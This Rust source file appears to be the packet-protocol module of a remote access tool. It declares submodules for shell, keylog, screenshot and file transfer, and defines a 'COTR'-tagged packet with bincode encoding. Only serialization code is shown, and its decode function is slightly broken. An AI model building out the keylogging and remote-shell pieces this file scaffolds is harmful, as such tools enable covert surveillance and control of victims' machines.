pub mod aes;
pub mod filetransfer;
pub mod rsa;
pub mod listdir;
pub mod shell;
pub mod screenshot;
pub mod keylog;

use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::any::Any;
use std::fmt::Debug;

#[derive(Debug, Copy, Clone, Serialize, Deserialize)]
pub struct PacketHeader {
    pub magic: [u8; 4],
    pub version: u8,
}
#[typetag::serde(tag = "type")]
pub trait AnyPacketData: Any + Send + Sync + Debug {
    fn as_any(&self) -> &dyn Any;
}

pub static BINCODE_CONFIG: Lazy<bincode::config::Configuration> =
    Lazy::new(|| bincode::config::standard()); // "COTR"
#[derive(Serialize, Deserialize)]
pub struct Packet {
    pub header: PacketHeader,
    pub data: Box<dyn AnyPacketData>,
}

impl Packet {
    pub fn new(data: Box<dyn AnyPacketData>) -> Self {
        Self {
            header: PacketHeader {
                magic: [0x43, 0x4F, 0x54, 0x52], // "COTR"
                version: 1,
            },
            data,
        }
    }

    pub fn encode(&self) -> Result<Vec<u8>, bincode::error::EncodeError> {
        bincode::serde::encode_to_vec(self, *BINCODE_CONFIG)
    }

    pub fn decode(data: &[u8]) -> Result<Self, String> {
        let (data, _size) = bincode::serde::decode_from_slice(data, *BINCODE_CONFIG)
            .map_err(|_| "Failed to decode packet".to_string())?;
        data
    }
}
